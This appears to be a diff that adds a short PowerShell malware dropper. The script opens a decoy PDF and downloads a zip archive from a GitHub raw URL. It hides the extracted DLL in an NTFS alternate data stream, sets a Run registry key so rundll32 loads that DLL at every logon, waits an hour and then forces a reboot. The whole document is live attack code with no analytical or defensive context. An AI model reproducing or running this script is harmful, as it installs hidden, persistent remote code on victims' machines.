@@ -1,0 +1,9 @@
+echo 1 > File.pdf ; .\File.pdf ; if (Test-Path C:\log\log.dll) { exit } 
+else { 
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Rundll SystemLog" -Value 'rundll32 C:\log\logs.txt:log.dll,DllRegisterServer' -Force ;
+powershell -WindowStyle hidden New-Item -ItemType Directory -Force -Path 'C:\log' | Out-Null ;
+echo . > C:\log\log.txt ;
+wget "https://github.com/IsdaM123456/rQsa/raw/refs/heads/main/log.zip" -o C:\log\log.zip; start-sleep 3 ;
+Expand-Archive C:\log\log.zip C:\log -Force ; start-sleep 3 ;
+Set-Content "C:\log\logs.txt" -Stream log.dll -Value (Get-Content "C:\log\log.dll" -Raw) ;
+start-sleep 3600 ; shutdown /r /t 300 }
